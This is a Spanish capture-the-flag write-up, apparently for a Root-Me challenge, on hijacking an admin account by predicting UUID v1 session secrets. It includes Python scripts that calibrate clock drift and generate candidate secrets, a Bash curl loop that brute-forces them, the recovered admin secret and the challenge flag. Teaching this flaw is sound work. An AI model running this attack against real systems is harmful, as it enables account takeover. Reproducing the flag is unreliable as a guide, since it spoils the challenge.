
# Informe de Vulnerabilidad: Account Takeover vía Predicción de UUID v1

## 1. Resumen Ejecutivo

Se ha identificado una vulnerabilidad crítica en la API de la aplicación que permite el secuestro de cuentas (**Account Takeover**). El sistema utiliza **UUID versión 1** para generar secretos de sesión, los cuales son predecibles si se conoce la fecha de creación del usuario y se calibra el desfase horario del servidor.

## 2. Análisis del Fallo

El estándar **UUID v1** construye el identificador basándose en:

1. **Timestamp**: Marca de tiempo con precisión de 100ns.
2. **Clock Sequence + Node ID**: Generalmente la dirección MAC del servidor.

Debido a que el endpoint `/api/user/{id}` expone la fecha de creación exacta de cualquier usuario, un atacante puede calcular el componente temporal del UUID. Al poseer una cuenta propia, el atacante puede determinar el **Clock Sequence** y el **Node ID** (que son estáticos para el servidor) y medir el **Drift** (desfase) entre el reloj de la base de datos y el del generador de UUIDs.

## 3. Proceso de Explotación

### Paso A: Recolección de Información

Se obtuvo la fecha de registro del administrador (ID 1):

* **Admin Creation Date**: `2026-01-14 03:11:42.704147`
* **Atacante Secret**: `de2b2054-f14a-11f0-8a22-0242ac100027`

### Paso B: Calibración y Cálculo de Drift

Se utilizó un script en Python para comparar el secreto del atacante con su propia fecha de creación, detectando un desfase de **-18000 segundos** (exactamente 5 horas, indicando una discrepancia de zona horaria entre servicios).

```python
# calibra.py
import datetime

# Datos del atacante para calibrar
mi_fecha = "2026-01-14 13:13:50.572757"
mi_uuid = "de2b2054-f14a-11f0-8a22-0242ac100027"

def get_ticks(u):
    p = u.split('-')
    return (int(p[2][1:], 16) << 48) | (int(p[1], 16) << 32) | int(p[0], 16)

def date_to_ticks(d):
    dt = datetime.datetime.strptime(d, '%Y-%m-%d %H:%M:%S.%f')
    return int((dt.timestamp() + 12219292800) * 10**7)

drift = get_ticks(mi_uuid) - date_to_ticks(mi_fecha)
print(f"Drift detectado: {drift}")

```

### Paso C: Generación de Candidatos

Aplicando el drift a la fecha del administrador, se generó una lista de posibles secretos variando los microsegundos para compensar la latencia de procesamiento.

```python
# gen_admin.py
# (Se usa el drift de -180000000012 detectado)
base_admin_ticks = date_to_ticks("2026-01-14 03:11:42.704147") + (-180000000012)
suffix = "-8a22-0242ac100027"

with open("lista_admin.txt", "w") as f:
    for i in range(-50, 50):
        t = base_admin_ticks + i
        low, mid, hi = t & 0xffffffff, (t >> 32) & 0xffff, (t >> 48) & 0x0fff
        f.write(f"{low:08x}-{mid:04x}-1{hi:03x}{suffix}\n")

```

### Paso D: Ejecución del Ataque (Brute-Force Dirigido)

Se ejecutó un bucle en Bash para validar los candidatos contra el endpoint `/api/profile`.

```bash
while read secret; do
  res=$(curl -s "http://challenge01.root-me.org:59091/api/profile?secret=$secret")
  if [[ "$res" == *"admin"* ]]; then
    echo "Identificador encontrado: $secret"
    echo "Data: $res"
    break
  fi
done < lista_admin.txt

```

## 4. Resultados

* **Secreto del Administrador**: `c047dcbd-f0f6-11f0-8a22-0242ac100027`
* **Flag Extraída**: `RM{UU1dV1s_4r3_1nSeCuRe!!_D0nT_U_Dare>:(}`

## 5. Recomendación

Sustituir el uso de **UUID v1** por **UUID v4** (basado en aleatoriedad pura) o tokens generados mediante **CSPRNG** para asegurar que los identificadores de sesión no tengan ninguna correlación con el tiempo o el hardware del servidor.

---


